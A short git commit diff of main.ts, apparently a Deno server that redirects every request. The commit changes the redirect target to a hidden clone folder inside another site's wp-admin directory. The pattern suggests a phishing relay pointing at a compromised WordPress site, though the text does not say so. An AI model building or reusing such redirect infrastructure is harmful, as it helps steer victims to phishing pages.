7bedec4ae49582b379d9c19eaa77f678a60a9b2d
Digital2025001 <bosmichael30@gmail.com>
2025-09-23 15:37:29 -0500

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://xscfnvn4tyynw.com/xfv/s", // Replace this with your actual link
+      Location: "https://moviesbyespresso.com/wp-admin/.clone_aveRwbqJ/Earthls/_+_==/", // Replace this with your actual link
     },
   });
 });
